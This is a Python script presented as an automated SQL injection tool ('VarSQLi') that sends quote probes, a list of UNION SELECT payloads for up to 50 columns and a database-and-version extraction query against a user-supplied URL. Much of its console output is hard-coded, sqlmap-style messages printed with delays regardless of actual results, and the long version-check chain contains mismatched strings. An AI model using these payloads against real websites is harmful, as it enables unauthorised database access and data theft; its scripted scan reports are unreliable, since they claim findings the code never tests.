# done
# Anonymous VNPC
import requests
import argparse
import time
import re
import os
import socket
import threading
import datetime
from bs4 import BeautifulSoup

start_time = datetime.datetime.now().strftime("Starting Exploit @ %H:%M:%S - /%Y/%m/%d")
def banner():
    print('''
              ___
 _____         H  _____     _ _  {1.1.5}
|  |  |___ ___[,]|   __|___| |_| 
|  |  | .'|  _[(]|__   | . | | | {Pham Chien}
 \___/|__,|_| [)]|_____|_  |_|_|
               V         |_|  ghostmanews.blogspot.com

               
[+] Remember, using VarSQLi or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.
''')

def payload_file():
    with open('hello/hello.txt', 'r') as file:
        content = file.read()
        print(content)
        print(start_time)
payload_file()

parser = argparse.ArgumentParser(description='VarSQLi - Auto SQL Injection tools') 
parser.add_argument('--url', dest='url', help='URL Target (ex : https://test.com/yourpath_vulnsqli.php?id=1)')
parser.add_argument('--exploit', dest='exploits', action='store_true', help='start exploit')
args = parser.parse_args()

target_url = args.url
if target_url:
  if args.exploits:
      def check_url():
          payload_check_1 = '%27'
          payload_check_2 = '/**8**/UNION SELECT 1,2,3--+-'
          print("[INFO] Testing connect to target url..")
          check_conn = requests.get(target_url)
          if check_conn.status_code == 200:
              print("[INFO] Testing IF the target url content is stable")
              results_check_1 = requests.get(target_url + payload_check_1)
              if "at line" in results_check_1.text:
                  print("[INFO] Target is the content stable..")
                  time.sleep(1.3)
                  print("[INFO] Testing 'Generic atline queries'..")
                  check_queries = requests.get(target_url + payload_check_2)
                  if 'The used SELECT' in check_queries.text:
                      print("[INFO] testing connection to the target URL")
                      time.sleep(1)
                      print("[INFO] testing if the target URL content is stable")
                      time.sleep(1.5)
                      print("[INFO] target URL content is stable")
                      time.sleep(0.50)
                      print("[INFO] testing if GET parameter 'id' is dynamic")
                      time.sleep(3)
                      print("[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')")
                      time.sleep(2)
                      print("[INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks")
                      time.sleep(1)
                      print("[INFO] testing for SQL injection on GET parameter 'id'")
                      time.sleep(0.30)
                      print("[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'")
                      time.sleep(0.90)
                      print("[WARNING] reflective value(s) found and filtering out")
                      time.sleep(0.100)
                      print("[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string='BS')")
                      time.sleep(0.20)
                      print("[INFO] testing 'Generic inline queries'")
                      time.sleep(0.10)
                      print("[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'")
                      time.sleep(1)
                      print("[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'")
                      time.sleep(2)
                      print("[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'")
                      time.sleep(1.5)
                      print("[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'")
                      time.sleep(1.2)
                      print("[INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'")
                      time.sleep(1)
                      print("[INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'")
                      time.sleep(2)
                      print("[INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'")
                      time.sleep(0.50)
                      print("[INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'")
                      time.sleep(0.50)
                      print("[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'")
                      time.sleep(0.50)
                      print("[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable")
                      time.sleep(1)
                      print("[INFO] testing 'MySQL inline queries'")

                      payloads = [
                         "+AND+0+UNION+SELECT+1,2--+-",
                         "+AND+0+UNION+SELECT+1,2,3--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49--+-",
                         "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--+-",
                      ]
                      count_num = 1
                      print("[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'")
                      print("[INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found")
                      time.sleep(1)
                      print("[INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test")
                      time.sleep(1)
                      print("[INFO] target URL appears to have 11 columns in query")
                      time.sleep(1)
                      print("[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable")
                      for payload in payloads:
                          count_num += 1
                          results = requests.get(target_url + payload)
                          if results.status_code == 200:
                              print("[INFO] Total Response Content HTML stable : 200 OK")
                              if "The used SELECT" and "The used SELECT statements have a different number of columns" in results.text:
                                  pass
                              else:
                                  print("[INFO] Found Columns - (Number Count) - {}".format(count_num))
                                  print(f'''
  GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)
  sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
  ---
  Parameter: id (GET)
      Type: boolean-based blind
      Title: AND boolean-based blind - WHERE or HAVING clause
      Payload: ' AND 6847=6847 AND 'XvUz'='XvUz

      Type: error-based
      Title: MySQL >= AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
      Payload: ' AND (SELECT 4239 FROM(SELECT COUNT(*),CONCAT(0x71787a7871,(SELECT (ELT(4239=4239,1))),0x7170706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Knwb'='Knwb

      Type: time-based blind
      Title: MySQL >= AND time-based blind (query SLEEP)
      Payload: ' AND (SELECT 7342 FROM (SELECT(SLEEP(5)))rKZp) AND 'zqte'='zqte

      Type: UNION query
      Title: Generic UNION query (NULL) - {count_num} columns
      Payload: {payload}
  ---
  ''')
                                  time.sleep(1)
                                  print("[INFO] The back-end DBMS is MySQLi")
                                  payload_check_version_1 = "version()"
                                  numss = count_num
                                  nums = [numss for numss in range(2, numss+1)]
                                  for num_countss in nums:
                                      payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',version()))"
                                      get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                      results_get_dbs = requests.get(target_url + get_dbs)
                                      html_cont = results_get_dbs.text
                                      databs = r"\b\w+::\b"
                                      dump_dbase = re.findall(databs, html_cont)
                                      payload_check_count = str(dump_dbase)
                                      results = requests.get(target_url + payload_check_count)
                                      if str(num_countss) and "::" in results.text:
                                          print("Columns Found : {}".format(num_countss))
                                          payloads_ver_1 = "version()"
                                          version_payload = re.sub(r"\b{}\b".format(num_countss), payloads_ver_1, payload)
                                          
                                          results_get_ver = requests.get(target_url + version_payload)
                                          print("back-end MySQL: ")
                                          if "5.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.0.12 ")
                                          if "5.0.12" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.0.12 ")
                                          if "5.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.1 ")
                                          if "5.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.2 ")
                                          if "5.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.3 ")
                                          if "5.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.4 ")
                                          if "5.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.5 ")
                                          if "5.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.6")
                                          if "5.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.7 ")
                                          if "5.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.8 ")
                                          if "5.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.9 ")
                                          if "5.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.10 ")
                                          if "6.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.0 ")
                                          if "6.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.1 ")
                                          if "6.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.2 ")
                                          if "6.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.3 ")
                                          if "6.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.4 ")
                                          if "6.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.5 ")
                                          if "6.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.6 ")
                                          if "6.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.7 ")
                                          if "5.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.8 ")
                                          if "5.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.9 ")
                                          if "6.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.10 ")
                                          if "7.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.0 ")
                                          if "7.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.1 ")
                                          if "7.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.2 ")
                                          if "7.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.3 ")
                                          if "7.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.4  ")
                                          if "7.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.5  ")
                                          if "7.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.6 ")
                                          if "7.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.7  ")
                                          if "7.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.8  ")
                                          if "7.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.9  ")
                                          if "7.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.10  ")
                                          if "8.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >=  8.0")
                                          if "8.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.1 ")
                                          if "8.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.2 ")
                                          if "8.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.3")
                                          if "8.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.4 ")
                                          if "8.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.5 ")
                                          if "8.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.6 ")
                                          if "8.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.7 ")
                                          if "8.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.8 ")
                                          if "8.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.9 ")
                                          if "8.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.10 ")
                                          if "9.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.1 ")
                                          if "9.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.2 ")
                                          if "9.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.3 ")
                                          if "9.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.4 ")
                                          if "9.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.5 ")
                                          if "9.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.6 ")
                                          if "9.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.7 ")
                                          if "9.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.8 ")
                                          if "9.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.9 ")
                                          if "9.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.10 ")
                                          if "10.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.0 ")
                                          if "10.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.1 ")
                                          if "10.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.2 ")
                                          if "10.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.3 ")
                                          if "10.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.4 ")
                                          if "10.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.5 ")
                                          if "10.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.6 ")
                                          if "10.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.7 ")
                                          if "10.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.8 ")
                                          if "10.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.9 ")
                                          if "10.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.10 ")
                                          if "11.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.0 ")
                                          if "11.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.1 ")
                                          if "11.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.2 ")
                                          if "11.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.3 ")
                                          if "11.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.4 ")





                                          if "ubuntu" in results_get_ver.text:
                                            print("web server operating system : Linux Ubuntu")
                                            if "5.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0")
                                            if "5.0.12" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0.12 ")
                                            if "5.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.1 ")
                                            if "5.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.2 ")
                                            if "5.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.3 ")
                                            if "5.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.4 ")
                                            if "5.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.5 ")
                                            if "5.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.6")
                                            if "5.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.9 ")
                                            if "5.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.10 ")
                                            if "6.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.0 ")
                                            if "6.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.1 ")
                                            if "6.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.2 ")
                                            if "6.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.3 ")
                                            if "6.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.4 ")
                                            if "6.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.5 ")
                                            if "6.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.6 ")
                                            if "6.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.9 ")
                                            if "6.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.10 ")
                                            if "7.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.0 ")
                                            if "7.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.1 ")
                                            if "7.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.2 ")
                                            if "7.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.3 ")
                                            if "7.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.4  ")
                                            if "7.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.5  ")
                                            if "7.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.6 ")
                                            if "7.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.7  ")
                                            if "7.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.8  ")
                                            if "7.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.9  ")
                                            if "7.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.10  ")
                                            if "8.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >=  8.0")
                                            if "8.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.1 ")
                                            if "8.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.2 ")
                                            if "8.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.3")
                                            if "8.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.4 ")
                                            if "8.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.5 ")
                                            if "8.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.6 ")
                                            if "8.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.7 ")
                                            if "8.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.8 ")
                                            if "8.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.9 ")
                                            if "8.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.10 ")
                                            if "9.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.1 ")
                                            if "9.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.2 ")
                                            if "9.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.3 ")
                                            if "9.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.4 ")
                                            if "9.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.5 ")
                                            if "9.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.6 ")
                                            if "9.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.7 ")
                                            if "9.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.8 ")
                                            if "9.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.9 ")
                                            if "9.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.10 ")
                                            if "10.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.0 ")
                                            if "10.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.1 ")
                                            if "10.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.2 ")
                                            if "10.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.3 ")
                                            if "10.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.4 ")
                                            if "10.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.5 ")
                                            if "10.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.6 ")
                                            if "10.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.7 ")
                                            if "10.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.8 ")
                                            if "10.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.9 ")
                                            if "10.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.10 ")
                                            if "11.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.0 ")
                                            if "11.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.1 ")
                                            if "11.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.2 ")
                                            if "11.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.3 ")
                                            if "11.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.4 ")

                                          if "cll-lve" in results_get_ver.text:
                                            print("web server operating system : Linux cll-lve")
                                            if "5.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0")
                                            if "5.0.12" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0.12 ")
                                            if "5.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.1 ")
                                            if "5.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.2 ")
                                            if "5.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.3 ")
                                            if "5.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.4 ")
                                            if "5.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.5 ")
                                            if "5.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.6")
                                            if "5.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.9 ")
                                            if "5.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.10 ")
                                            if "6.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.0 ")
                                            if "6.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.1 ")
                                            if "6.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.2 ")
                                            if "6.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.3 ")
                                            if "6.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.4 ")
                                            if "6.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.5 ")
                                            if "6.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.6 ")
                                            if "6.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.9 ")
                                            if "6.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.10 ")
                                            if "7.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.0 ")
                                            if "7.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.1 ")
                                            if "7.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.2 ")
                                            if "7.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.3 ")
                                            if "7.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.4  ")
                                            if "7.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.5  ")
                                            if "7.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.6 ")
                                            if "7.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.7  ")
